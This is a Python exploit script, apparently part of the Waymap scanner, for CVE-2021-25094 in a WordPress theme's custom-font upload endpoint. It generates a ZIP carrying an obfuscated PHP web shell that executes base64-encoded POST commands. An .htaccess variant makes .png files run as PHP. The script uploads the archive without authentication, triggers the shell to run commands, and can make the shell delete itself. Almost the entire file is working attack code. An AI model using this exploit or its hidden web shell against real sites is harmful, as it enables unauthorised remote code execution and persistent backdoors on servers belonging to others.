# Copyright (c) 2024 Waymap developers
# See the file 'LICENSE' for copying permission.
# CVE-2021-25094 - WordPress Vulnerability Exploit

import requests
import urllib3
import io
import zipfile
import string
import random
import base64
from platform import python_version
from colorama import init, Fore, Style

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
init(autoreset=True)

def generate_zip(compression_level=9, technique="php", keep=True):
    print(f"{Style.BRIGHT}{Fore.YELLOW}[•] Generating ZIP file with shell technique '{technique}'")

    buffer = io.BytesIO()
    
    if python_version() >= '3.7.0':
        zip_file = zipfile.ZipFile(buffer, "w", zipfile.ZIP_DEFLATED, False, compression_level)
    else:
        zip_file = zipfile.ZipFile(buffer, "w", zipfile.ZIP_DEFLATED, False)

    if technique == "php":
        shell = "<?php "
        shell += "$f = \"lmeyst\";"
        shell += "@$a= $f[4].$f[3].$f[4].$f[5].$f[2].$f[1];"
        shell += "@$words = array(base64_decode($_POST['text']));"
        shell += "$j=\"array\".\"_\".\"filter\";"
        shell += "@$filtered_words = $j($words, $a);"
        if not keep:
            shell += "@unlink(__FILE__);"
        shell_filename = "." + (''.join(random.choice(string.ascii_lowercase) for i in range(5))) + ".php"
        zip_file.writestr(shell_filename, shell)

    elif technique.startswith("htaccess"):
        shell = "AddType application/x-httpd-php .png\n"
        zip_file.writestr(".htaccess", shell)                 

        shell = "<?php "
        shell += "$f = \"lmeyst\";"
        shell += "@$a= $f[4].$f[3].$f[4].$f[5].$f[2].$f[1];"
        shell += "@$words = array(base64_decode($_POST['text']));"
        shell += "$j=\"array\".\"_\".\"filter\";"
        shell += "@$filtered_words = $j($words, $a);"
        if not keep:
            shell += "@unlink('.'+'h'+'t'+'a'+'cc'+'e'+'ss');"
            shell += "@unlink(__FILE__);"
        shell_filename = "." + (''.join(random.choice(string.ascii_lowercase) for i in range(5))) + ".png"
        zip_file.writestr(shell_filename, shell)

    else:
        print(f"{Style.BRIGHT}{Fore.RED}[!] Error: Unknown shell technique '{technique}'")
        return None, None, None  # Indicate failure

    zipname = ''.join(random.choice(string.ascii_lowercase) for i in range(3))            
    return buffer, zipname, shell_filename


def upload_zip(profile_url, zip_file, zipname):
    print(f"{Style.BRIGHT}{Fore.YELLOW}[•] Uploading ZIP archive to {profile_url}/wp-admin/admin-ajax.php?action=add_custom_font")
    url = f"{profile_url}/wp-admin/admin-ajax.php?action=add_custom_font"
    files = {"file": (f"{zipname}.zip", zip_file.getvalue())}
    
    headers = {
        "X-Requested-With": "XMLHttpRequest",
        "Origin": profile_url,
        "Referer": profile_url,
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36",
        "Accept": "*/*",
        "Accept-Language": "en-US,en;q=0.9"
    }
    
    r = requests.post(url, data={"action": "add_custom_font"}, files=files, headers=headers, verify=False)

    if r.status_code != 200 or not r.text.startswith('{"status":"success"'):
        print(f"{Style.BRIGHT}{Fore.RED}[!] Upload failed! HTTP {r.status_code} - {r.text}")
        return False
    
    print(f"{Style.BRIGHT}{Fore.GREEN}[+] Upload successful!")
    return True


def trigger_shell(profile_url, zipname, shell_filename, cmd):
    shell_url = f"{profile_url}/wp-content/uploads/typehub/custom/{zipname}/{shell_filename}"
    encoded_cmd = base64.b64encode(cmd.encode("utf8")).decode("utf8")
    
    print(f"{Style.BRIGHT}{Fore.YELLOW}[•] Triggering shell at {shell_url}")
    try:
        r = requests.post(url=shell_url, data={"text": encoded_cmd}, verify=False)
        if r.status_code != 200:
            print(f"{Style.BRIGHT}{Fore.RED}[!] Shell trigger failed! HTTP {r.status_code} - {r.text}")
            return False
        
        print(f"{Style.BRIGHT}{Fore.GREEN}[+] Shell triggered successfully!")
        print(r.text)
        return True

    except Exception as e:
        print(f"{Style.BRIGHT}{Fore.RED}[-] Error during shell triggering: {e}")
        return False


def scan_cve_2021_25094(profile_url):
    cmd = 'id'
    techniques = ["php", "htaccess"] 

    for technique in techniques:
        print(f"{Style.BRIGHT}{Fore.CYAN}[•] Attempting exploitation using technique: {technique}")
        zip_file, zipname, shell_filename = generate_zip(technique=technique, keep=True)

        if zip_file is None or zipname is None or shell_filename is None:
            print(f"{Style.BRIGHT}{Fore.RED}[!] Exploitation failed due to ZIP generation error with technique: {technique}")
            continue  # Skip to the next technique

        if upload_zip(profile_url, zip_file, zipname):
            if trigger_shell(profile_url, zipname, shell_filename, cmd):
                print(f"{Style.BRIGHT}{Fore.GREEN}[+] Exploitation successful using technique: {technique}")
                return True  # Exit on success
        else:
            print(f"{Style.BRIGHT}{Fore.RED}[!] Exploitation failed using technique: {technique}")

    return False  # Indicate overall failure
